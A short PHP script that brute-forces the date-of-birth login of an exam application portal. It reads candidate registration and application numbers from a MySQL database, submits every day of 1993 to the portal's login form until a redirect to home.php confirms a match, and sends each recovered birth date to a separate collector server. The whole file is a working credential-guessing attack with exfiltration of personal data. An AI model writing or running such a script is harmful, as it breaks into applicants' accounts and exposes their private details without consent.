<?php
include "Snoopy.class.php";
$server  = "http://192.168.208.235/iit/";
$url = "http://192.168.216.1/viewapp/index.php";
$snoopy=new snoopy;
$db = new mysqli("192.168.208.235","iitjee","","iitjee");
$r = $db->query("SELECT regno,form_no from selected where date is null  AND regno like '6%' ORDER by regno DESC");//6 is least worked on
for($i=1;$i<=12;$i++):
  for($j=1;$j<=31;$j++):
	echo $i."  ".$j."\n";
    while($row = $r->fetch_row()):
      echo $row[0]."\r";
      if(check($row,$i,$j)):
        respond($row[0],$i."/".$j."/1993");
      endif;
    endwhile;
  endfor;
endfor;
function check($row,$month,$date){
	$form = array(
		'day'	=>str_pad($date,2,'0',STR_PAD_LEFT),
		'month'	=>str_pad($month,2,'0',STR_PAD_LEFT),
		'year'	=>'1993',
		'proceed'=>'Proceed',
		'appln_no'=>$row[1],
		'regn_no' =>$row[0]
	);
	global $snoopy,$url;
	$snoopy->submit($url,$form);
	if(strpos($snoopy->lastredirectaddr,'home.php')!==false):
		$snoopy->lastredirectaddr=false;
		return true;
	else:
		return false;
	endif;
}
function respond($reg,$date){
	global $server;
	echo "\nRESPONDING $reg - $date \n";
	file_get_contents($server."submit.php?reg=$reg&date=$date");
}
